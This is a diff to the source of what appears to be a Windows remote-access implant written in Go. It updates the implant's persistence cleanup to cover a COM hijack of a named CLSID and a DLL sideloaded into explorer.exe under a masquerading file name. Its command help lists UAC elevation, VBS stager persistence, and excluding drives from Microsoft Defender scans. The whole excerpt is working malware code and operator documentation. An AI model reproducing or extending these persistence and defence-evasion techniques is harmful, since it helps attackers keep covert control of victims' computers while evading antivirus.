@@ -1654,10 +1654,14 @@ func removePersistence() string {
 	regDelete(HKCU, `Software\Microsoft\Windows\CurrentVersion\Run`, "Finder")
 	legacyPath := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Themes\SystemThemeService.exe`)
 	os.Remove(legacyPath)
-	// Clean up DLL sideload if present
-	sideloadPath := filepath.Join(os.Getenv("LOCALAPPDATA"), `Microsoft\OneDrive\version.dll`)
-	os.Remove(sideloadPath)
-	return "Persistence removed (startup + sideload)"
+	// Clean up DLL sideload + COM hijack if present
+	comCLSID := `{BCDE0395-E52F-467C-8E3D-C4579291692E}`
+	comRegKey := `Software\Classes\CLSID\` + comCLSID + `\InprocServer32`
+	regDelete(HKCU, comRegKey, "")
+	regDelete(HKCU, comRegKey, "ThreadingModel")
+	sideloadDLL := filepath.Join(os.Getenv("APPDATA"), `Microsoft\Windows\Shell\ShellServiceHost.dll`)
+	os.Remove(sideloadDLL)
+	return "Persistence removed (startup + COM hijack + sideload)"
 }
 
 // ================================================================
@@ -1983,8 +1987,8 @@ SYSTEM
   elevate        - Attempt UAC elevation
   persist        - Add persistence (Startup folder VBS stager)
   unpersist      - Remove persistence (startup + sideload)
-  sideload       - Install DLL sideload persistence (OneDrive)
-  unsideload     - Remove DLL sideload persistence
+  sideload       - Install COM hijack + DLL sideload (explorer.exe)
+  unsideload     - Remove COM hijack + sideloaded DLL
   excludec       - Exclude C:\ from Defender scans
   excludeall     - Exclude C:\ through G:\ from Defender
   enableio       - Enable keyboard/mouse (admin)
